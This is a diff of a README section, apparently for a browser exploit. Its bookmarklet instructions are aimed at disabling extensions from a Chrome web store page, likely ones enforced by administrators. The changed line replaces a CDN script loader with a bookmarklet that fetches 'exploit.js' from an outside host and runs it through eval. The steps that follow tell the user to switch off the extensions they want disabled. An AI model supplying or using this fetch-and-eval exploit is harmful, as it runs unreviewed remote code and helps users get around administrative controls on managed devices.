@@ -12,7 +12,7 @@ There are several vesions of this exploit you can use, here are the 2 most commo
 
 ## BOOKMARKLETS
 1. Bookmark the script below:    
-```javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())```
+```javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});```
 
 2. Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. 
 3. Flip the switches on the extentions you want to disable. Simple!  
